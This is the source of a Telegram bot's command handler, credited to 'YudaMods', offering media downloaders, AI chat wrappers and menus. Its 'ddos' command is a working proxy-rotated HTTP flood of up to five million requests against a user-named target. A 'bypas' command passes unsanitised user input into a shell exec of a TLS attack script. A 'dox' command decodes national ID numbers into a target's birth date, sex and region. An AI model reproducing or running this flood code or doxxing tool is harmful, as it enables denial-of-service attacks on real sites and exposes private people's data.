/*
Script By YudaMods
*/
require("./settings")
const {
    Telegraf,
    Context,
    Markup
} = require('telegraf')
const {
    message,
    editedMessage,
    channelPost,
    editedChannelPost,
    callbackQuery
} = require("telegraf/filters");
const {toFirstCase,
        isNumber,
        formatp,
        parseMention, 
        resize, 
        getRandom,
        generateProfilePicture, 
        getCase, 
        runtime, 
        FileSize, 
        h2k, 
        makeid, 
        kyun, 
        randomNomor, 
        jsonformat, 
        isUrl,
        fetchJson, 
        sleep,
        getBuffer
        } = require("./lib/myfunc2");
        const { formatSize } = require("./lib/myfunc3");
const chalk = require('chalk')
const fs = require('fs')
const fetch = require('node-fetch')
const os = require('os')
const speed = require('performance-now')
const util = require('util')
const yts = require('yt-search')
const axios = require('axios');
const {
    simple
} = require('./lib/myfunc')
const { pinterest } = require("./lib/pinterest")

const hxz = require ("hxz-api")

module.exports = ClientX = async (ClientX, bot) => {
    //console.log(ClientX)
    try {
        const body = ClientX.message.text || ClientX.message.caption || ''
        const budy = (typeof ClientX.message.text == 'string' ? ClientX.message.text : '')
        const {
            isUrl
        } = simple
        const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)        
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const user = simple.getUserName(ClientX.message.from)
        const pushname = user.full_name;
        const user_id = ClientX.message.from.id + " "
        const username = ClientX.message.from.username ? ClientX.message.from.username : "YUDAMODSZX";
        const isCreator = OWNER[0].replace("https://t.me/", '') == ClientX.update.message.from.username
        const from = ClientX.message.chat.id
const prefix = isCmd ? body[0] : ''
        const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const isGroup = ClientX.chat.type.includes('group')
        const groupName = isGroup ? ClientX.chat.title : ''

        const isImage = ClientX.message.hasOwnProperty('photo')
        const isVideo = ClientX.message.hasOwnProperty('video')
        const isAudio = ClientX.message.hasOwnProperty('audio')
        const isSticker = ClientX.message.hasOwnProperty('sticker')
        const isContact = ClientX.message.hasOwnProperty('contact')
        const isLocation = ClientX.message.hasOwnProperty('location')
        const isDocument = ClientX.message.hasOwnProperty('document')
        const isAnimation = ClientX.message.hasOwnProperty('animation')
        const isMedia = isImage || isVideo || isAudio || isSticker || isContact || isLocation || isDocument || isAnimation
        const quotedMessage = ClientX.message.reply_to_message || {}
        const isQuotedImage = quotedMessage.hasOwnProperty('photo')
        const isQuotedVideo = quotedMessage.hasOwnProperty('video')
        const isQuotedAudio = quotedMessage.hasOwnProperty('audio')
        const isQuotedSticker = quotedMessage.hasOwnProperty('sticker')
        const isQuotedContact = quotedMessage.hasOwnProperty('contact')
        const isQuotedLocation = quotedMessage.hasOwnProperty('location')
        const isQuotedDocument = quotedMessage.hasOwnProperty('document')
        const isQuotedAnimation = quotedMessage.hasOwnProperty('animation')
        const isQuoted = ClientX.message.hasOwnProperty('reply_to_message')
        const timestampi = speed();
        const latensii = speed() - timestampi

        const reply = async (text) => {
            for (var x of simple.range(0, text.length, 4096)) { //maks 4096 character, jika lebih akan eror
                return await ClientX.replyWithMarkdown(text.substr(x, 4096), {
                    disable_web_page_preview: true
                })
            }
        }
        const getStyle = (style_, style, style2) => {
            listt = `${lang.getStyle(style, style2)}`
            for (var i = 0; i < 300; i++) {
                listt += '» `' + style_[i] + '`\n'
            }
            reply(listt)
        }

        //get type message 
        var typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = 'Image'
        else if (isVideo) typeMessage = 'Video'
        else if (isAudio) typeMessage = 'Audio'
        else if (isSticker) typeMessage = 'Sticker'
        else if (isContact) typeMessage = 'Contact'
        else if (isLocation) typeMessage = 'Location'
        else if (isDocument) typeMessage = 'Document'
        else if (isAnimation) typeMessage = 'Animation'

        //push message to console
        if (ClientX.message) {
            console.log(chalk.black(chalk.bgWhite('[ CMD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || typeMessage)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname) + '\n' + chalk.blueBright('=> In'), chalk.green(isGroup ? groupName : 'Private Chat', ClientX.message.chat.id))
        }
        
        
        
 async function downloadMp3 (link) {
try {
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
await ClientX.sendMessage(m.chat, {audio: { url: kyuu.result.url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "YOUTUBE - PLAY",
body: "YudaMods",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: "https://telegra.ph/file/cc52b17ed4eb2b41e2070.jpg",
sourceUrl: link
}
}},{ quoted: m })
/*} else {
await m.reply(`File audio ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch (err){
console.log(err)
}}

       
        
 const sendMessage = (chatId, text) => bot.sendMessage(chatId, text);
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}       
   
        
const { Blackbox } = require('./lib/blackbox')
const { bard } = require('./lib/bard')
const { jadianime } = require('./lib/toanime')
const { geminii } = require ('./lib/gemini.js')
const { chatWithGPT } = require('./lib/azure')
const { whisper } = require('./lib/whisper')
const { bestimChat } = require('./lib/bestimChat')
const { Animedif } = require('./lib/animedif')
const { postData } = require('./lib/aoyo')
const { thinkany } = require('./lib/thinkany')
const { leptonAi } = require('./lib/leptonai')         
                  
                       
                            
                                 
                                      
                                           
                                                
                                                     
                                                               
        
        switch (command) {
case "ddos":
  {
      if (!text) return reply('_send domain target_')
        const SocksProxyAgent = require('socks-proxy-agent');
          const HttpsProxyAgent = require('https-proxy-agent');
            const userIP = 'myserver2.junn4.my.id'; // masukkan link panel tanpa https://
              const targetUrl = text; // Ganti dengan URL tujuan yang sesuai
                const proxyListFile = 'lib/proxy.txt'; // Nama file yang berisi daftar proxy
                  const totalRequests = 5000000;
                     const delay = 100;
                  function readProxyList() {
                try {
              const data = fs.readFileSync(proxyListFile, 'utf8');
            const lines = data.trim().split('\n');
          return lines.map(line => line.trim());
        } catch (error) {
      console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

  function sendRequest(target, agent, userIP) {
    if (allowedIPs.includes(userIP)) {
      axios.get(target, { httpAgent: agent }) // Menggunakan httpAgent untuk proxy SOCKS
         .then((response) => {
       
        // Lakukan sesuatu dengan respons
        }
          )
             .catch((error) => {
        
        // Tangani kesalahan
                }
                    );
                } 
             else 
          {
        console.error(`IP Mu Tidak Terdaftar`);
      }
    }
  function sendRequests() {
     const proxyList = readProxyList();
       let currentIndex = 0;
         function sendRequestUsingNextProxy() {
             if (currentIndex < proxyList.length) {
                const proxyUrl = proxyList[currentIndex];
                    let agent;
                        if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
                             agent = new SocksProxyAgent(proxyUrl);
                                 } 
                                   else if (proxyUrl.startsWith('https')) 
                                 {
                             agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
                        }

                    sendRequest(targetUrl, agent, userIP);
                 currentIndex++;
                setTimeout(sendRequestUsingNextProxy, 0);
             } 
         else 
       {
     setTimeout(sendRequests, delay);
  }
    }
       sendRequestUsingNextProxy();
            }
                 const allowedIPs = ['myserver2.junn4.my.id'];
// Mendapatkan alamat IP pengguna
            sendRequests();
      reply('_menyerang_...')
    }
  break
case 'runtime':{
    ClientX.deleteMessage().catch(() => {});
      reply(`YudaMods Online ${runtime(process.uptime())}`)
    }
  break  
case 'play': {
  if (!text) {
                  return reply(`*Example :* ${prefix + command} Drunk Text`);
            }
            try {
                // Mencari di YouTube
                let search = await yts(text);
                let linknya = search.all[0].url;
                await reply('Sabar... sedang mencari!');
                let kyuu = await fetch(`https://api.kyuurzy.site/api/download/aio?query=${linknya}`);
                let data = await kyuu.json();
                await ClientX.replyWithAudio({
                    url: data.result.url
                });
            } catch (error) {
                console.error(error);
                reply('Terjadi kesalahan saat memproses permintaan.');
            }
}            
break;        
case 'play': {
    if (!text) {
        return reply(`*Example :* ${prefix + command} Drunk Text`);
    }
    try {
        // Mencari di YouTube
        let search = await yts(text);
        let video = search.all[0];
        let linknya = video.url;

        await reply('Sabar... sedang mencari!');
        
        // Mendapatkan data audio dari API
        let kyuu = await fetch(`https://api.kyuurzy.site/api/download/aio?query=${linknya}`);
        let data = await kyuu.json();

        // Mengirim audio beserta informasi detailnya
        let infoLagu = `🎵 *Nama:* ${video.title}\n📀 *Artis:* ${video.author.name}\n⏱️ *Durasi:* ${video.timestamp}\n👁️ *Dilihat:* ${video.views}\n🔗 *Tautan:* ${linknya}`;
        await ClientX.replyWithAudio({ 
                url: data.result.url,                        mimetype: 'audio/mp4', 
            ptt: false 
        } , {
  caption: infoLagu
     })
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat memproses permintaan.');
    }
}            
break;

case 'bypas':{
    if(!isCreator) return reply('[!] Developer Feature')
     if (!q.includes(' ')) return reply('*Example* example.com [time] [rps] [threads]')
     mm = args.join(' ')
     m1 = mm.split(" ")[0];
     m2 = mm.split(" ")[1]; 
     m3 = mm.split(" ")[2];
     m4 = mm.split(" ")[3];
     const url = m1;
     const time = m2;
     const rps = m3;
     const threads = m4;
     const proxyListFile = 'lib/proxy.txt'
     exec(`node lib/tls-arz.js ${url} ${time} ${rps} ${threads} ${proxyListFile}`, (error, stdout, stderr) => {
     if (error) {
          reply(`eror: ${Error}`);
          return;
        }
        if (stderr) {
          reply(`${stderr}`);
          return;
        }
        reply(`${stdout}`);
      });
      console.log(`${proxyListFile}`)
      reply(`*Attack Server*\n*• Method* : main.py\n*• Target* : ${m1}\n*• Time* : ${m2}\n*• Rps* : ${m3}\n*• Thread* : ${m4}\n*• Proxy* : proxy.txt\n\n`)
    }
  break
  case 'pinterest':
  case 'pin':
    ClientX.deleteMessage().catch(() => {});
        if (args.length < 2) return reply(`Exemple\n${command} query -jumlah`)
            reply('Tunggu sebentar...')
                var jumlah;
                    if (q.includes('-')) jumlah = q.split('-')[1]
                        pinterest(q.replace('-'+jumlah, '')).then(async(data) => {
                            if (q.includes('-')) {
                                if (data.result.length < jumlah) {
                            jumlah = data.result.length
                        reply(`Result ${data.result.length}`)
                    }
                for (let i = 0; i < jumlah; i++) {
            ClientX.replyWithPhoto({
        url: data.result[i]
    }, {
  caption: 'DONE'
     })
        }

            } else { 
                ClientX.replyWithPhoto({
                    url: global.tamnel
                       }, {
                      caption: 'DONE'
                    }
                )
            }
        }
     )
  break
  case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
  
//Ai
case 'bardai': {
                if (!text) return reply('What is your question?')
                const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=you are an intelligent ai that helps humans`)
    const msgai = data1.result;
reply(`${msgai}`)
           }
            break             
case'gemini':{
let text
if (args.length >= 1) {
text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else return reply(`*Example*: ${prefix + command} siapa kamu`)
let res = await geminii(text)
reply(res[0])
}
break
//=========================================\\======
case 'blackboxai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://itzpire.com/ai/blackbox-ai?q=${encodeURIComponent(text)}`)
                const ClientX = d.result
                reply(ClientX)
           }
            break
case "ssweb": {
if (!q) return reply("[!] sertakan link")
reply("[!] Mohon Tunggu Sedang Proses")
  try { 
  let anu = `https://api.vreden.my.id/api/ssweb?url=${encodeURIComponent(text)}&type=desktop`
  ClientX.replyWithPhoto({
        url: anu
    }, {
  caption: 'DONE SS WEB'
     })
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'text2image':
case 'text2img': {
if (!q) return reply('mana promt nya Kak')
reply("mohon tunggu sebentar")
	try {
	let anu = `https://api.vreden.my.id/api/text2img?query=${encodeURIComponent(text)}`	
	ClientX.replyWithPhoto({
        url: anu
    }, {
  caption: 'DONE'
     })
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'dalle': {
  if (!text) return reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	ClientX.replyWithPhoto({
        url: hasilnan
    }, {
  caption: 'DONE'
     })	
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
  }
  break
  
  case 'lirik': {
    if (!text) return reply('[!] Masukkan judul lagu');
    const hasil = await fetchJson(`https://widipe.com/lirik?text=${encodeURIComponent(text)}`)
    const thumb = hasil.result.image
const lirikk = `
*Title :* ${hasil.result.title}
*Artis :* ${hasil.result.artist}
*Url :* ${hasil.result.url}


`
    await ClientX.replyWithPhoto({
    url: thumb,
  }, {
     caption: `${lirikk}`
        }
        )
reply(`*Lyrics :* ${hasil.result.lyrics}`)        
}
break;

case 'facebook':
  case 'fb':{
     if (!text) return reply('[!] link..!')
        ClientX.deleteMessage().catch(() => {});
            reply('[!] Wait Result...')
  const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
                const videoBuffer = data.result.Normal_video;           
        await ClientX.replyWithVideo({
    url: videoBuffer,
  }, {
     caption: `DONE`
        }
        )
     }
  break
  case 'ig': 
  case 'instagram':{
    if (!text) return reply('[!] link...!')
            reply('[!] Wait Result...')
                const data = await fetchJson(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    if (data && data.result && data.result.length > 0 && data.result[0].url) {
        const hasil = data.result[0].url;
                    await ClientX.replyWithVideo({
                url: hasil,
                   }, {
                caption: `[ INSTAGRAM DOWNLOAD V1 ]
    CREATOR: YUDAMODS
    SCRIPT BY: YUDAMODS            `
            }
        )
    }
    }
  break


case 'tiktok': {
if (!text) return reply('[!] link...!')
            reply('[!] Wait Result...')
   let anu = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)   
   const vidnya = anu.video.noWatermark
   await ClientX.replyWithVideo({
                url: vidnya,
                   }, {
                caption: `[ TIKTOK DOWNLOAD V1 ]
   Caption: ${anu.title}
   Likes: ${anu.stats.likeCount}
   Comment: ${anu.stats.commentCount}    Share: ${anu.stats.shareCount}
   Views: ${anu.stats.playCount}
   
SCRIPT BY YUDAMODS`
            }
        )
    }
  break 
        

case 'listram': case 'ramlist':
ClientX.deleteMessage().catch(() => {});
let menuh = 
`*Hi @${pushname} 👋*
    
▭▬▭( 𝐑𝐀𝐌 𝐘𝐀𝐍𝐆 𝐓𝐄𝐑𝐒𝐄𝐃𝐈𝐀 )▭▬▭
• 1GB ( PREMIUM ) ✅
• 2GB ( PREMIUM ) ✅
• 3GB ( PREMIUM ) ✅
• 4GB ( PREMIUM ) ✅
• 5GB ( PREMIUM ) ✅
• 6GB ( PREMIUM ) ✅
• 7GB ( PREMIUM ) ✅
• 8GB ( PREMIUM ) ✅
• UNLI ( PREMIUM ) ✅
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
ClientX.replyWithPhoto(
        global.pp, {
            caption: menuh,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break            
case 'nikparser': case 'dox':
if (!isCreator) return reply("khusus owner")
if (!q) return reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
break

case "menudownload": {
let wkwkw = `▧ Download Menu
│ • ${prefix}tiktok
│ • ${prefix}instagram
│ • ${prefix}facebook
│ • ${prefix}play
│ • ${prefix}pinterest 
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: wkwkw,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menudatabase": {
let wkwkw = `▧ Database Menu
│ • ${prefix}adddb
│ • ${prefix}deldb
│ • ${prefix}cekdb
│ • ${prefix}resetdb
│ • ${prefix}nikparser
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: wkwkw,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuai": {
let wkwk = `▧  Ai Menu
│ • ${prefix}bardai
│ • ${prefix}gemini
│ • ${prefix}blackboxai
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: wkwk,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuimage": {
let yahaha = `▧ ImageCreate Menu
│ • ${prefix}txt2img
│ • ${prefix}dalle
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: yahaha,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuobf": {
let yahaha = `▧ Obfuscate Menu
│ • ${prefix}obf1 - Var [HardObf!]
│ • ${prefix}obf2 - Var [ExtremeObf!]
│ • ${prefix}obf3 - DeadCode [ExtremeObf!]
│ • ${prefix}obf4 - EncCode [ExtremeObf!!]
│ • ${prefix}obf5 - ABCD [HardObf!]
│ • ${prefix}obf6 - Name [ExtremeObf!!]
│ • ${prefix}obf7 - Name [ExtremeObf!!]
│ • ${prefix}obf8 - Name [ExtremeObf!]
│ • ${prefix}obf9 - Crass [HardObf!]
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: yahaha,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuddos": {
let komtol = `▧ DDoS Menu
│ • ${prefix}ddos
│ • ${prefix}dos
│ • ${prefix}mix
│ • ${prefix}bypass
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: komtol,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menucpanel": {
let ngen = `▧ CreatePanel Menu
│ • ${prefix}1gb
│ • ${prefix}2gb
│ • ${prefix}3gb
│ • ${prefix}4gb
│ • ${prefix}5gb
│ • ${prefix}6gb
│ • ${prefix}7gb
│ • ${prefix}8gb
│ • ${prefix}unli
│ • ${prefix}listsrv
│ • ${prefix}listadmin
│ • ${prefix}createadmin
│ • ${prefix}cekid
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: ngen,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuinstallpanel": {
let ngentod = `▧ InstallPanel Menu
│ • ${prefix}installpanel
│ • ${prefix}installwings
└───···`
ClientX.replyWithPhoto(
        global.pp, {
            caption: ngentod,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case 'menu': case 'back!':
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
let poke = 
`Hi 👋 ${pushname} saya adalah assisten bot yang di buat oleh Yuda, Jika menemukan Error Silahkan Report ke owner

▧  Info Bot
│ • BotName: ${BOT_NAME}
│ • OwnerName: ${OWNER_NAME}
│ • Info : Case
│ • Library : telegraf
│ • RAM : ${formattedUsedMem} / ${formattedTotalMem}
│ • Date : ${new Date().toLocaleString()}
└───···
▧ List Menu
│ • /menuai
│ • /menudownload
│ • /menudatabase
│ • /menuimage
│ • /menuobf
│ • /menuddos
│ • /menucpanel
└───···

Original Script || By YudaMods`
ClientX.replyWithPhoto(
        global.pp, {
            caption: poke,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break  

            default:
        }
    } catch (e) {
        ClientX.reply(util.format(e))
        console.log('[ ERROR ] ' + e)
    }
}